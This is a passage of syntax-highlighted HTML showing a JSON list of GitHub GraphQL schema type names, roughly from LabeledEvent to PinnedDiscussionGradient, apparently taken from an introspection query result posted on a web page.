&#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LabeledEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Language&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LanguageConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LanguageEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LanguageOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LanguageOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;License&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LicenseRule&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LinkRepositoryToProjectInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LinkRepositoryToProjectPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LockLockableInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LockLockablePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LockReason&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Lockable&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LockedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Mannequin&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MarkDiscussionCommentAsAnswerInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MarkDiscussionCommentAsAnswerPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MarkFileAsViewedInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MarkFileAsViewedPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MarkPullRequestReadyForReviewInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MarkPullRequestReadyForReviewPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MarkedAsDuplicateEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MarketplaceCategory&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MarketplaceListing&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MarketplaceListingConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MarketplaceListingEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MemberStatusable&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MembersCanDeleteReposClearAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MembersCanDeleteReposDisableAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MembersCanDeleteReposEnableAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MentionedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MergeBranchInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MergeBranchPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MergePullRequestInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MergePullRequestPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MergeableState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MergedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Migration&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MigrationSource&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MigrationSourceType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MigrationState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Milestone&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MilestoneConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MilestoneEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MilestoneItem&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MilestoneOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MilestoneOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MilestoneState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MilestonedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Minimizable&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MinimizeCommentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MinimizeCommentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MoveProjectCardInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MoveProjectCardPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MoveProjectColumnInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MoveProjectColumnPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;MovedColumnsInProjectEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Mutation&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Node&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;NotificationRestrictionSettingValue&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OIDCProvider&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OIDCProviderType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OauthApplicationAuditEntryData&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OauthApplicationCreateAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OauthApplicationCreateAuditEntryState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OperationType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrderDirection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgAddBillingManagerAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgAddMemberAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgAddMemberAuditEntryPermission&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgBlockUserAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgConfigDisableCollaboratorsOnlyAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgConfigEnableCollaboratorsOnlyAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgCreateAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgCreateAuditEntryBillingPlan&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgDisableOauthAppRestrictionsAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgDisableSamlAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgDisableTwoFactorRequirementAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgEnableOauthAppRestrictionsAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgEnableSamlAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgEnableTwoFactorRequirementAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgEnterpriseOwnerOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgEnterpriseOwnerOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgInviteMemberAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgInviteToBusinessAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgOauthAppAccessApprovedAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgOauthAppAccessDeniedAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgOauthAppAccessRequestedAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgRemoveBillingManagerAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgRemoveBillingManagerAuditEntryReason&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgRemoveMemberAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgRemoveMemberAuditEntryMembershipType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgRemoveMemberAuditEntryReason&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgRemoveOutsideCollaboratorAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgRemoveOutsideCollaboratorAuditEntryMembershipType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgRemoveOutsideCollaboratorAuditEntryReason&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgRestoreMemberAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgRestoreMemberAuditEntryMembership&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgRestoreMemberMembershipOrganizationAuditEntryData&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgRestoreMemberMembershipRepositoryAuditEntryData&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgRestoreMemberMembershipTeamAuditEntryData&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgUnblockUserAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgUpdateDefaultRepositoryPermissionAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgUpdateDefaultRepositoryPermissionAuditEntryPermission&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgUpdateMemberAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgUpdateMemberAuditEntryPermission&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgUpdateMemberRepositoryCreationPermissionAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgUpdateMemberRepositoryCreationPermissionAuditEntryVisibility&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrgUpdateMemberRepositoryInvitationPermissionAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Organization&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationAuditEntryConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationAuditEntryData&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationAuditEntryEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationEnterpriseOwnerConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationEnterpriseOwnerEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationIdentityProvider&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationInvitation&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationInvitationConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationInvitationEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationInvitationRole&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationInvitationType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationMemberConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationMemberEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationMemberRole&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationMembersCanCreateRepositoriesSettingValue&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationTeamsHovercardContext&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;OrganizationsHovercardContext&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Package&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageFile&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageFileConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageFileEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageFileOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageFileOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageOwner&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageStatistics&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageTag&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageVersion&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageVersionConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageVersionEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageVersionOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageVersionOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PackageVersionStatistics&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PageInfo&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PermissionGranter&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PermissionSource&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PinIssueInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PinIssuePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PinnableItem&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PinnableItemConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PinnableItemEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PinnableItemType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PinnedDiscussion&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PinnedDiscussionConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PinnedDiscussionEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PinnedDiscussionGradient&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span 